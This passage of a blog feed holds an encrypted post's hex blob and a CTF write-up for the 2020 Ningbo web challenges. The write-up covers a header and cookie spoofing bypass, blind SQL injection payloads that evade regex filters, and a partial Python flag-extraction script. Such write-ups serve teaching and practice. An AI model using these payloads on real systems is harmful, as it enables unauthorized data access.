494504e4575c8edc5d1cf01779d9ce0c2b0e8ef9487b8b861b79cf8730d516581ac18dd34a8db0492c497ee99bc3e47328c317a8fd216e6490c56305365f3c94051b3c5551ca1939f62ae61c53cbe8c8665e15d58b72ca9d3c64caa95a5da9b17b0f0eb1089f1fd5a462ed9439caed92bb8407b4f7a7bca4218cd3f39e6bebf6aeece4020baa5fcd7b6ef468152a9f5a4fb7467c61e2285f1b76f83b5346d26f646ac2747ef9259b1806566cc908913a5649c2f677217d210a27e5f409b3e01f432d26b7d9c32234cde63f87e3e456aabf25242d592d5ccb0c8c28f73efee820a0dc32e18855698646687dad74b9a4051f75944b19d6a2fab8c918b0f810e35d6cdecbf066be5091f3e03842c7ac4271317efd47ce5880552c1f3f648558d8cddcc313cfe016c3f19f252f21db874065c958e66e177ae0d8bba3481ca65f2a17da8cdbcfb05ffd22218aed3029e16c61b86c8fae1080a143a79dcb9e400810d72ab14824d038f9260b48f2cd4ae74e7e06200bd516c4c644f8c007cfd74af17c055b45cad57bee117a5157dfd885105e5d91560f4b11c99be4114dedc1907a4875fe99ac123171f75b26fb187f40fa75a7d61806d954f358cd700885da499cedbe6db8f7a95a9e82983c35c9bd491364deef7aea88b587b811c806b229ae3903390672de570b2a2271b2cca52baa3b7cfc1ac1e3deb1517427c1e0feb7e5e78e951ac555a2bb46c9237482e44a44ead9629aac68ff231a137b6ee8fc2ef3f1d3dd0ab22e7e735e131c02b5c8b49e0b69b8bae5309c7eb3a3ae5e014b8a5bd9b6ef3e5c92411ca522336acbb36b352eaf24daab566e77b2ff23be21b31ff49138bc49ff8e033c883faedb40f54aef51544c289d146908aec14f9adce6083dde3da703d468da1cfbbbe27af1cbda5c8213b054b84140e728ea7d65bcea930144add6ba2c7b4ec40431743dc7a2c037c166c6f885c844c6f265fe7c558dfdd84306d4e7910503c3ea9d4bf4901864ed86ca9316a55410e4c653b7fe9b6480e4107d1f55889c4aae270481af5cbea242589316292fe105915bb49f052680663b4184320fcfabb0f9d7be03b6b7487d12ebe32aa2ff0998144353465452324be6737802a368ae477c7b85283bffc7d6e89537106d9736278f74df888f6e2690d39310478fc19046635adf558ed7870d13953344d323863e27a1cd51b6d240964b3ae133027bd9909250eeb09a68bba7319efd3a22fcd5c9763faccf8ee30f81a889ec7ada05300f079f20b6a0d673321df06916821a047505dc65b792a762f36010b8283f004cc1ea3aa309b6661ee1f75e051c64e099eb3a0718973a236fface9c20f7fd4efb7392adde25fd3758a9d2b9d76f84b7918b0e4ad33dd22808d78d7d1f493e643db30064004b2b221857da8e6a7f0b10b211651a1a9047992a2b1158482e6fcba55918111b3c7a559c3cc611506ce3c35c0d53e18b42c83a0dd3595876c27a9be639343360771368eb48f46405c2f672b9cfe8ca3ce707622241e7699140749d322ed3c8583838f2acb1b57e2ae715c9ee0b4d9289154c051b1a03be3c810b29c9291146be8e5ef49c2988612ddc35c6e6bb805d0c2634a16c90db980f3cd4de4ceba2f97a63226861663106cb9649a78a1aec659342d29ca2aab341d6601cd9d540d191dc590329824de69c539cb4e517b68bfaf02d2b810f9cf609761b881f2de90fc747a506c38d68a7b0f7472747698706d03a7a61c8366c38c8e04f1e8be4d7c9047204c6dffc404431960fe1f2d89fe54d1072bcc3c11dd35d4b53671a76ac956c43a7f2da0f65e1ae50b20c7acc28f5144bd6007871d1287d6b01e9476e9061eac11cfea87f60d211949ae46f11082a169b266db270cdcc55584bbd93f146d6f4ad1e40e1ca6879f494c8e361503c3ec901a61522d28273b7b73eb2a3a01e5a0c12c5ce325809b34e7a2e9349d2a8ab2167a7ec8be73fcd346e18653fad193560fa7b76585d85a20101a1f3bbdba707d1bc107860816ff45ee04a1f234e2e3e4d9853375e08d8ae370a65ac999cebf20f883526d6faed930d8729d4bb66132968bd017731e8f65a92621f03935ac10b67ea55e47ead9a20d439bbf69fb8bf417e05230492e01da77d2c8d0a1644da4dbb9a582670326e46631cf724f9aad065c08f243d2724aae77bbc1d642f04d885bdd77a7ba2fee0d457621f4901abb00605998b2c1f8e0776831fe86025bfcf4a51809023946d141e737f56610710d780db3e7939b2a7f68e88a248427d99c95301624052da0a99dc2163c4804ed50f7d2ced180a257b78b82c19a6b426c459cf6e741e49dd504b548d39abb8b94a602d30422ffe847d8141cf5af00bdfdb6a2d5f6cabcb92b377c97a4a18accd5aff808819a65866f2227c43dab4c6bf198237cf0830bac1387648afd46033aa0474ea1b428f857c6128c2dc07fef2ed284087f93d9febcc35eda020b1374679cf4bc96bedaadb8a2211eeb993ce9bf9de053653790f1c11e4b1b9d33b363a362a275daed287cfbeabc47bcd6139b91d7179a027e41682e65ee69c6462c13c5b7c4432835e3c4218ef5be110ec286a7b861c521e0aa2742e2c828d558ce0763ef89a767835d1278b23e48c51bef9da184fbb125404fdb81939f3efd7ab318c0d2f7fe1e5b541f555f11daf12b648339a7cf48223d0976ee628e64a5c5e1b61e9373af0f9c5c113e20b9d896fec3bdcfc4892dccb73c0b50844ba3ad3e82133e2506b22e054a2bd46bd471f2a6b011f65b4df07ae8e02c664c55bc66419790205e71dded336183bac8cc826d6602a9efab4d491574a1d2fec4ee03ce421fba5ac988b624c262c9024eb3c8d954f48c2fe39333f6fbc761ff971a4657a13864d3b11935603a60cfefad743f77dd5430755e4a9976ebf096a6eca8fe81d00d978098ee7d442b1599464a0bc5fb066a2072a4cb7f4a70883dac5eb30cfcec73afeb0dc796624f1af1c5c04dd2d1f50397323b7acb368ce04dba916ba07da6ceb40be0e31f4b9a671f6501430eabbe5cf5e81fd2570616cad7b1c9a24b8e0d2fb7076b625cc1c9d487e18ab13429d0b75501f72f1d63c8211d82f853e62d89cfdd11ba9032a66a0e948fc64cbe8b2aa66d1baa806d6584fd0c971acb55dc84f89124eaab59fcd499a71fd2b6501d784162286886531a2c65ba1da098728bf96af626f63a56697ae2b429c0d0765b9fe3ebdeb4947298d70556c7214291b6948e7ce4b8f7a93c926ca6c9df694311c2237c29f69d0f0f1320b370dbd5063611051d8ed2ee7b35fbe2456f23d5672f7a45a2bd45e0c00d3b48b0f67161b46324c616257671a163ef1937636e230a3d75c89651a03696424fce229c07cf70b0237e5fff932fbe908e7d895edaf54d27138ad635ca1ba268e97ec13cca5a7145f79065fc70dc107df285652846f56d13a2d6efb197edcfcd22fc4bfa20b13d540120a098246ac71a104199a19eedd19821b5d54579a745300d12dd5a2c206fd7e873b42e334d1b3024545d0ff4fa00affcc935bcdd734b8155665976ea343aa9d3aae8b750ee572d116e576c13dc81c3e3dd5df1311762c3350b0d8383784e8252dd35a030968006ce7baf54e5b1ffb16029eefa7adfc53c2c8ad5aefb837ee74e9b93e19912aea69c3f223a26d392039219df7a4b0c2811ef436cc47c2dfc98f79cb5b1f58e406b75ee2213b1577ded5fbda3c3b9979a6f2dcf617b246faaae308b441242510eeafe466e05df118054174d62b80c85b04077c39048298e2e872356b0b95495c48fb09f155ff6804068ac2d3a13be9eec6471e079884e7b09f7223bcfba3ac8be4f3ed12605edc0b9c25c3c8bd6188a821a61168d97cfc47df9fef4d7a43ce63f4337e6606f0b4de89bd0d56f8162884086a737ea285da73f688f429d65027d99827fcf51e5a5e5890bbf08a1d7bb976d64e6b9493419bd6b3f4045b769d240fbb5583b8b12e14314446f17b0378fefa0a05e6f466146893476f126cb7f86c2d0c0d7bbf20ff360521ec13e58ff737403c1d439beac7ea81024855bbb04542db9b367bfed650ef65e9ed83bcd3b8d834eaea5e297a7d7b80e783cf9b38ea9057c63f7dc3e755228a43d87fc1548c2013bddc0f14eccf0c1ec0d2589f7d8ccc95a947d08d40a767f4415e8d0f5a4bed7da600ebe5526e2bcd42727ed33ba0c6df2daf0fae045eabcb51ca523dbaaa48d29d41d10e8260e637843f9ff2c300703903c70e778dc234c7d62574c72881a6977523828ed1260a9dba86472d417260e81da778c75f809102db29c62944ec4f5bb6f1a646d13ea4033a36da90a42453bb3d1ed3d6c81a333d135ebc589379b50d3b55c3785cf0e830072dce3f5dfda4054ffcb528b48a489c347a12c7597ab181eab168ac5f2361c1bf3b2694691bec47756192142e1616c46b413ae734afe26002e21638acce71fad525103f38b04b01c1cde19e3828096e1d5bd7f9c0bf9f31943b51de666c8535596f77769bdcdd8700dbf531fad52be89099a09555c161cc061c8f7f57281603003ee365d6cd437cb18a001833e4c9808879402d30317db33316f597a2f70ea66ed1df2e1d8499fc28b4a505dd543b9c531c97a28b72d2f193a6c4a97433ae07210c092efe8d6baf5a50881dfcdee5f6eee222b030cb94dabd4df248eda7428637fcc388b4836d09377ce9b465c8b52d4e375cdb837d25bc50149aa7278744da26a0642131e3863ce225da2ed445fed277fa6b0069785a2aaca75dba2c88d831bf13cd22d36694a76905e056868eba87055f1421314b6710dd1712f873791d081a6081dd218e27d23b558ee60c1015869a6cb264c19e01d9e3f828c7c744b9b235ecc509e0780c1c198264a2e2c44cfa913427824bdad675beaa319c5b8cd7b88e7085716082dc73de2b6dd44f5144084e3c3457e4f9b9a97e47a81f8c95325beee05458be7660ce85db44c626e6ca89eb6de40eef9f7cc35a80a941619c3a5cb990258ac612ee1eb4a498519529ca94a8fde5b3357122b8a35e179e600098695eec72a16278a29e7845fbbed80086fae003cc7a2218e92ae2527957d899ff43ee181406eac0af733760d21a2d8201d063234300c1e6b90393ae97127e3d9da819c6f0a3b5fc21192ef49c0e6f860b3e980052730a0e53b61b1e218f91ade46f04cb3810bf45ddca13a0065a5fbe4c99ab3a427d1cea5d221b0bed6e5c7c967b9e6fc0d57df04bc26d1db1a44a5407e8876a3e56436a74ede9e5c39f2620dda97e250074be64727a3e3d15191466554de0b51721bf9b99f3e25ab4dad366f54660f3b9ad9bc51a1ad9d707bee0d9e689fa2ca1300bd7bc5a04b88ad88713cb77baca487f0d4a078eaa1797687c51fd1fcd4a5f06cd1a09297ee7d2483e3698df9e953244aececa980676a5564f298a23dc2d816bbdbbff6dccaa493f4a3c68f70edc14ca1c8a41b1ce6c6033f58e95ccad3b95b87a5071e41a087c431a08a40db26b8594f0d514518bebc4714ba9861a439f2b27a26b9664443e13db728eb84b1beb4a0550172348e87eafb71d0aa6c3a2098e12601e75cfc5325a0669d9013fa0fa543f6cd743023e152d746d4f1e951feb162fd9dd6e332ec9893ce1ac4ba4d0b679058851d21303dd9faacc41a1c4f9750e787ea05b1adc873dda3be2d7080984455012f895dc697f0e337ca7b957047e375755edcb7278e3fdb02138609c7316b248eab35c4a37571b1a844dbe63804f0276c97e2ac66631c23ea16239c46c42f1d152f2d2c9c5cd142c02a5c2f7b4248c6c9fb78f290619ea183aaf2c6952e1e55ba7ca03d03fca7983b9306a674d0e429d09e9a3b2903669e7168cbe8814e3282e520af59a3ec5dcaf8e505942216a9a0b9385b42ebb7d0c9754ae587ad52930698900198abdc5edf93629561850fbd95cb5ae0c71981cddb2bc0d8703c245f5041fa0cf4c801b5098f1f8f0402af27f59b8974d9b89b645096b59a78097d89baddc9d58eb1628d739be29bd002668a9e59e91a03d6756e847681808072a4c2a00630ded881e0c85c520e9581282d760f09b2887e94c56a5c89ea2cfe298989e15eb31e9829f77e86ceab82d8fb9a2654fd0342651df421ec457d37bf798deb3ff6394b0055c19b8d496803bf5f1066c20832cf86c659f73dbe29a9586a6e2a15d0742cd1ffaba44e23793f59bc5d89df6f4a826bfa1097b0c336dc76172ed7fe7bcff324da68beb32dbb12380875a6331b21a2a18de048ca8ac78f7fdfd5b94519cbdbf215449ac62fb89a437356234175a9f16438d6dc5328de3bbb52e6ed4aef7d3acfc0e64837ddebf1123f91b71eab6229ccb18e098bc2bf468c9fa4a8228b2ef4fdc52c93fe33dab1b81cf3fcba82b5e245540c3adbdc800f26477f468b1860790f88bce4022614b1cb847b27c091e8bcd4ab17d3a55f4ead21aa0a8725299ab7fa499a560ab0dca7fdca0a7b21c191feb0d97c70ad6be35cecf66bd8e07b78c0c4b01c40324b8d14bc07e879a251486e57691b69a6944e92b0b223b6da64fe2d6972d7384a90627cc7b550e3117af3551037b2b72f76ce05c819ffb7df4c91f02cecef9124e9aab255422790a3fe877902a0aa8d32f4707fb756c32514534c4ca2e0de89d38f185e87fafd6e46ae9cf6b6686d0893ef780980c97f436538da5423484859b1048f3822ffad3c6d0078fc16ecb0c675c971228781d08a1d92b2972f3b35101f9b6ae37424f7410678701fff58c8f3b01006b13d512ae0f06c08c8e86a9ad32277d58e0d2ba1ea59c72cd07f359f467c2a92bd0e5a54381f0ffcddb0d4983fe850c884a2255ba60cba20b65ba6e45fafd27102da8414d3f2e53abe6732abe163434022990099a9e65fbbf25cd61c18056e7c9f7b234db671a67fa02bab3662cd39de863ba5aed0071c2f7eb5eff97731ea597bff9c8575bb25c375ddb5d0156486fef3b5dd1564f1b42782b2c44e1edbdaed5bc9b5408ae9656a68e3e51b36ffd6f262e8ea14cb13341e200a6048b35bdd310eca1e67d253904e6a609184875a51ea7f72ee481a79de6a6aeca5db3eef1c207e677415c158a7d4d061e5800ca2efc7713a91ba3bc74ecd8f37abbdeefac09ad24220023204e1ca9aaa2f54edef8dcebb1a9768716da2da02c3ddb917d715aa4469e9108e4cdb51e496c69aa9528c33cce6feba8c0a45d33724ab66bef7752eefdfe994fe67e203109b1e695ab4aa4699d3d847331008d4668bef962ddfcad1e50b0665780ff22286223a804a1b933d62e0ed8ea9d4e6b3266b5725fe9bbacd5432574dc4b77a8d4dfaa44e7671f3a31764f1a3e0af67793425d8964b7a2ffcf6365eb31f635b8ea7861b3f24c3a6ac760f96b35b018989a68e72fd6dbf4810d229d7ed7aaea2b7fd8e0df5587dfb2662cb327b8d4f5606754ceef847b6eb2760ca4b7437b99264875afb429591adfbf4ea4440580a8d896db11278b64344e24e2036c8800ec6c4ef2f47e1a64e58d53041c1f56f24f2fe98f5dd9557ecd0c0dd769542ffea1902132238c70363b517ec70f55263b48a5163f66f6718783a52643edc374fc036ee9501fdf5abf0ff528054124ed2d49287fd0e94a832b88b9414bb5dbdb4001cccef012f4e19fec9d0184797d22d559552234c40e69b0f5a4ec79b624d92d75b525e342eb4ce0854daee22a4e058487e9465ca00a56d86b381a357bbc74a699877c013e5e51891443d4944568cfe066fe79feabd524f526c5d624e3104477a4678df644fe6d1a3bce89277e20f5671922c2428166763e68404f4d1cc99c960245baa5c4abeb9b22ab67a4ac52c288defd24fd9167b7e1e9ba85ede1384ab31ad239ad7654248332cd6a8dda7c87877427b85551b853ab12be4891b2e9547f72893ede4d3f85120c6024f037d15be5249cd206172e6d933ab590212df5fc7c021b9fcb5b1161602cec7762bbd1c435213e58d16a1e34101104019d4b970b3ab9d63bcac1726647e3dbb4eaff4773c8659dbcc48a94eed9db3b666174411b793c909d6ecaa035cd26fcc23b8be25f62f09106f2a2adbdb1b712e33664f7f096af22f5a5c32eae9503d42165bfe19184adcd52cecfc3ebc90b00fe5594f64a12b255f0096317bd748ee0c0132f62627573390bb5a9a51f0d3229ebd067f9de7eb3c24cae0b7eb8abb0c458f159745314701c3778d1e72d9e18f4c9d29ae2914f654a5463f8902a6acf34838eda795472c9b266f28ae2595de00cbd661953ae4cc0c5f6c8169e96fd470962acafd0c9a9a6fdc4695a64f3b3ac922d766a02a8864579e76ba2267a5e0a2663b1713b0d540240b3c805b9eda2fe50f40a6a154eab8395b4e075aca1fc040dfc277f38e3b8b9898a8b65019ee41942b039f0f5e84cb48ab20cc97919dea7bfd345eb9733f8feee67ae5002bff71515a96a14e7bcab4626d24b5a466e86d15a182298ef0d6f2e76b6e8c742e5c7f709a13d231a2b69e858f82a91d7047af840cb8e3f5b3350fd4d238624f6c0ee3a55a67bc0c0054ebd5130563ffe9665c8d26aa61f710577bde06164a2eeb8384ffe7c61a296e72521c9f53cb6d10b3aae5ad2e040d4ffbba778f87b7927139ed6ba019ea04e4eed0fa91b827520bea5cf809113424e81c8be282ac8e9cb2a6d228a5105cb4269b4f0910355329adbc957683f6d0b4bae78741d05d95b57efef758932f51c9ea3890e2dc367452d90b4911bdf744328bc24083973fb949672e5d63d0484077af99162e98a30c51ff9839136f7cfc26ffd7d26263e80f8ab6054b61cb9fd2e4e7381eb776fd43877d3df59b0dd0ff7d55f110bf615af1797b239b5c957144c60faf59d84fc1888b14b6af7aac7cd2ca66041c8b3139c7698c0c508a7b4d0e2a6bcc6548cf8ad5c1de8aed205a1b68ac594e90b154cfcb5f30c0ec298ac03d58462684f94ca28cda2e24e8aff74b36e26900bf1b562ebc70ee4cd64759d001f0063a93e0e9f95c9aaf4514c5614220b249cb5c42a7996a40b608a99a46adffd243059319563d56923e2f03d7996020207681bdf2c83d437d240ca57c54d0e08153d998da95be576f021476ad5a0b4160600b86a671d721dd2dfd171ccf0fa74fe8e55a1cf34fb8fc5a8c003ef8dc657fe7a21266f30c7105d881aa6344b7794ec364891c93c2a0450090bedd2a3e90b7e735f4c7aabcd82285f1535a28ad4b508ed304ad497cd6b46b4e4e612fc5442d3667675c5dd287f00f94e25056fb3d89f90290b9a8306458dfdd19a8be0e1eb407f6198d85eda5eeb36de62bf82e38352128fbabbede0e7351259542c6776b070053c58b6ba619df88471fd3bae081a3979794e48150a8445b10309f43f11d77be92fc3f7a92b1645b6bc009f0340bf97d983c0ab32caadb5e60a70f62132a28490eca7d5e8e1531b68bc0f042b3d7947ae5cb11ca288ff7a23b98ed5d70ece01ee4c3e33f4612432b678343a55e0b4eaa17fd345b20feeb134f26b0921e8138f36723e2751831bae870ee952e1a09746f00c4dbd350b64d81c343549f6e3d8794e19ec83beaf73b8fbcd3792e9c9c500870c74f695e0a9861b2b1d1ae41d2d87c59569edc5268f3a0c614f83073fd2149d93a3f1db880201963c484764406dbdd15f9149f70018e0784acbdb7fe5a7e77f091a5d1a6755e97003932313b2299a26aecac85d16d9fc82532c12b7d90982a9b85e3a594fe01c61c007a05f2215630eeadd7501c3c6749087c8e35f1fe1d4a5174288696380f940e8fb7b5262131665190596baf9b3ce57c7bd917751b5a4e72e3fa7087af3cbdcc6006f3f52b28f590cb0b60be12e764e397ec603839a9a4a29ac05429b91e5de9cc274a254e74542aa3fa26fa8f6a111f96e715896e5a0e2051a09da05298baad6aefd0ce82463250a6673a96ff4564c664b1309f5ff4c99c5bfbae4293c484a96854b1d0654f66edb6adb0702e0216fbc85a9e17206f1c77edcb590da0c56969d48b466310bdfc533098e5dd01a61daf8f8a14eb91dba0c52f65cd7fe00f12797040e8126c1118050531040ed006d8dcb38bf1d6305ef847a1f01d97c1236a201d692d30594021280b995304e5d2e9bceaaf764d7d2d36290d516b14b9f4939111fed6bf13a8226a11d3f0d956ee204a6d1761c269af288f196eaa60101988debe58764c4ef9b49dba2caecbb1980d3395e0738dab792992e1ac019d11ad369fe0158b8c690c6ebfe1be3ff16965100a1a6a21c7883ab047dcd74f544a75e2c98900be93069f3eb0eb6828574d5a6e1a44e76bbe31e590a9ee3c579ccf740713212655b999130a48760996f9ca0bcb8d24dec6e9aee877b06ed06fa5556da8e30e976b4b1444978dfc7859e165ba1617f4f96f578c6002690a109d3c455a2d1c055a166c025611dfa225d65607cedf96ea5ee82175912ed7ebce4763c882fa0ead9d16755338daa59b7cf5e265f190a4c003b88b19080492560fbec7dad06ba4372d4500f182d6383cff764ad82f113e4b20e8f8c5c3ed0f3bfff14d877aef9598b72f6b03954b0d64aab675ec8d6f62840cf0507837e3ab3396070035f3b5166f74ed7147a66e452314b1914ca4ad3767995ea1bae872c3b2862fb45c3218e47aecd852966a9932b6381e11b52328f3dc81823c219bfff7a809dacfab662cb55644fa9aeccd21a240cc6b7db2a3514d4bcfc1908c47e716bf3ec489105d81eba2873fbb77af5ca17f904b5d9fc41deaa6eceb4f79342db0b4765804896442088bfbee66facdc5dca0e70b9c74088e0d0f491642fb2ee6d66997f72de745495a3694fd69f726cb5041c2545880345b762b3d346d7b20d207964d734ce65d84d346e77cc1e0b08f150816ea447eb76341bfbf1c6a30817ff91e8789adee58c6c7b61c1779b5bafd0908d5952ae45e09ba1f71a40eb4a8e90ccb189f8088da16702f0644e8cfb97d3f8adfba419ca4b5c77c9e06cbccbda899f5f9f84a2a787c24eb98d5e0d8074f96ef0c38b3bd33d848dc4670d9b104abaf4a6413949dd655d314f5c3837330aab4c50ded006bd97309341c278bbfc38b5ade1116e9ff2c4eb8fa75a6c2547700b330cc45846665668ee689a571249a29eb61f44455c6afbfeccd1a5ff467b5af661fe152d28aecb8be7fc656cd421619389a0df411f9036189975719bfeaf69d7cc82bb451e61eced658a33435c1f29ecf9f70629d3b64b784a8f4764ca4347b8a08f5f539de007d17007a8a9e6ffe4b91a8a165070e906b8238b99fe79ea2eb4446d2b19038b4df55cac774577ce23371f4089bc7f8c057b6dfa17a31990b2ff177389ffa6a6c1e8941f56b42af576a328853367a704142412b249c7b71eb8fadd49453963da41b4103c6099471160e68d3c30eff14748b9d7892b4a465de65022a65b9c94243235506c6bc093fd407be91e13cd2c2e45c80479ee0fcaac8af1c418ee0191188deef644aa75e65962b1cb183d9c306f87b68d084cb3cc1be0b4730c8f3c6bdf41cf9851cb2221157ea8acec9670c33ad907e43f9def30cebf3942398743aa278ceb3fcf43c36a7431922772af51779663c631d364f4779c017d0a0ea244fa0565f2c9e58718f79dbaf7f678163ab39e5a036c0ee3595a26df8ae23fe0321c25176b325e67067019de9c74534ad4f2fe51bd929c066db7f79e3bad95f86e6acd4ddece20180d18f6755af1ab6bf2ef336a68b5356e90f6f1b482dd0d05f94514ba99916e3a8343c7ce1169a2739875b7c37ea7a8a4ba21a545fa07610e459d41d5ce60fb9e035a484a60efa29e75a5ce4b9f904900442c022ca35431e79c641cbf170f7740022d5253fe66c707d737f710ccd93515181ee55c57eebe18cbdf3cab444e39cfc940d2da9a14715bd2bc7e579ea63b955c52a263f0c53b3628e4297d3ee82add5fc9782d981725808083ab2f67201267e5b5a3bb4c65fc74bbad99641d4a426aaa0a7d14f27a67dd0ee896a5d9fcd4c674f4c27c4dcfa3ac8639db93322d7acec032b3be92e3a55eeb1bb7c2c877916f6e6e8458b96e92dd9cf10e698b389c59804ab6ac2edae835936910c6c24aeb86ebc4717ad100ee33e35eb10ecc3ce7579bdf09040ff8ecaa61fcca44c57f170f16378214bcbca654554a579a604db8b8ee49b1599de2899482831197965903f3b061325d571b6e8971580bf742bb135bbfc43ed259a1b2ea16cb8119ad7a2a5d306620e5e59f4dda890ba572723f9c1214cbc9b4751fd93999f41de12d9b83223e00772a9efeae49a6cb40b062489845292b7c8184059f8d80f4795a703c3ff13ef660a12508c40f805d3401d57ba919f88564de512256768b216d198f914c23a4c54342631a83750527a794cd6d44e109dcd13a80606a79d9c2712e9828ee293c0975819325ff13e58b76d5de5112de1c27c6ccfa8d499c524dcf45a63bd99bb2d6e1d54979c23edf8550fbc291cd3b6e382d9ffab1fe7fbaa2022e8cee7ccb85345f2f751ff4a583917ea1f783e6df6f80353c29c1970841f1beafd9242d06aed65c364ebdb45a77b884c1d286d0bf72392b03b4eed63a3745336c292ecbdee92c9d761d47f9c5dcb85ae86</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>2020宁波市第三届网络安全大赛-web题writeup</title>
    <link href="https://c1aysec.github.io/2020/05/25/2020%E5%AE%81%E6%B3%A2%E5%B8%82%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-web%E9%A2%98writeup/"/>
    <id>https://c1aysec.github.io/2020/05/25/2020宁波市第三届网络安全大赛-web题writeup/</id>
    <published>2020-05-25T07:34:45.989Z</published>
    <updated>2020-07-09T07:11:53.698Z</updated>
    
    <content type="html"><![CDATA[<h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>比赛时间只有一下午，最终很遗憾没有进入线下，菜是原罪，将过程记录一下吧</p><h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><p>提示：这是只有本地管理员权限才能访问的页面，你想要越权访问？</p><p>直接<code>X-Forwarded-For: 127.0.0.1</code>结合<code>Cookie: user=admin</code></p><p><img src="http://pic.c1imber.top/blog/20200705/rDiunidzUJgz.png?imageslim" alt="mark"></p><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>在这道题上花了一些时间，注入类型为数字型，注入点的位置应该是在where xxx=xxx的位置，经过一番测试发现最基本的注入语句都被过滤了，很大可能是是基于正则的过滤，经过fuzz后猜测一些过滤规则如下：</p><p>首先尝试union select进行回显，发现过滤规则如下：</p><p><code>出现数字+任意字符+SQL关键字（这里的正则没有绕过）</code></p><p>1select   被过滤<br>1union    被过滤<br>等</p><p>导致不能union select联合查询</p><p>尝试盲注，发现过滤规则如下：</p><p><code>任意字符(出现数字)like|=|&gt;|&lt;|&lt;&gt;|\|\||\||^|&amp;等运算字符</code>，如下图</p><p><img src="http://pic.c1imber.top/blog/20200705/BT1dbUR7ppAP.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200705/h2OJJlyQj2Eq.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200705/97NIGGEkDfih.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200705/6Bju1BmlVN1x.png?imageslim" alt="mark"></p><p>导致不能使用substr、substring、mid、right、left等字符串截取字符去进行盲注判断</p><p>经过一番分析可以看到上面过滤的关键点就是尽量避免出现数字，可以使用<code>like</code>模糊匹配进行绕过，具体如下：</p><p>当id=0时，结果为：学号：0，成绩为： 94<br><img src="http://pic.c1imber.top/blog/20200705/NxsMPF90axhj.png?imageslim" alt="mark"></p><p>当id=1时，结果为：学号：1，成绩为： 52<br><img src="http://pic.c1imber.top/blog/20200705/cQrYTXJ5rECj.png?imageslim" alt="mark"></p><p>尝试将<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=(select flag from flag) like &apos;flag&#123;%&apos;</div></pre></td></tr></table></figure></p><p>此时结果为真，返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">学号：(select flag from flag) like &apos;flag&#123;%&apos;，成绩为： 52</div></pre></td></tr></table></figure><p>这里返回了学号为1的学生成绩，说明可以通过这种方式获取到flag，但是在写脚本后发现只能获取到flag的前两个字符<code>d7</code>，之后就卡住了，继续进行分析</p><p>当<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=(select flag from flag) like &apos;flag&#123;d7%&apos;</div></pre></td></tr></table></figure></p><p>这个时候还返回正常<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">学号：(select flag from flag) like &apos;flag&#123;d7%&apos;，成绩为： 52</div></pre></td></tr></table></figure></p><p>但是继续尝试获取字符时发现被拦截</p><p><img src="http://pic.c1imber.top/blog/20200705/wYHHCamngbP0.png?imageslim" alt="mark"></p><p>由此判断存在新的过滤规则如下：</p><p><code>&#39;出现两个数字以上%&#39;|&quot;出现两个数字以上%&quot;</code></p><p><img src="http://pic.c1imber.top/blog/20200705/qFkp4QADeyKi.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200705/5XmX8eLAMMco.png?imageslim" alt="mark"></p><p>所以导致在获取<code>d7</code>两个字符后不能继续获取数据</p><p>解决办法：在mysql模糊匹配当中，<code>_</code>可以匹配一个位置的字符，所以可以通过这个特性把payload当中已经获得到的数字替换为<code>_</code>，这样就可以保证payload当中不会出现两个数字以上，如图，可以继续获取到第三个字符为e：<br><img src="http://pic.c1imber.top/blog/20200705/OFG8HJOaSv8w.png?imageslim" alt="mark"></p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line">session = requests.Session()</div><div class="line">l=<span class="string">"01234567890abcdefghijklmnopqrstuvwxyz"</span></div><div class="line">flag=<span class="string">""</span></div><div class="line">flag1=<span class="string">""</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</div><div class="line">    paramsPost = &#123;<span class="string">"id"</span>:<span class="string">"(select flag from flag) like "</span>+<span class="string">"'flag&#123;"</span>+<span class="string">"%s"</span>%(flag1+i)+<span class="string">"%'"</span>&#125;</div><div class="line">        headers = &#123;<span class="string">"Origin"</span>:<span class="string">"http://119.61.19.212:58888"</span>,<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"Referer"</span>:<span class="string">"http://119.61.19.212:58888/"</span>,<span class="string">"Accept-Language"</span>:<span 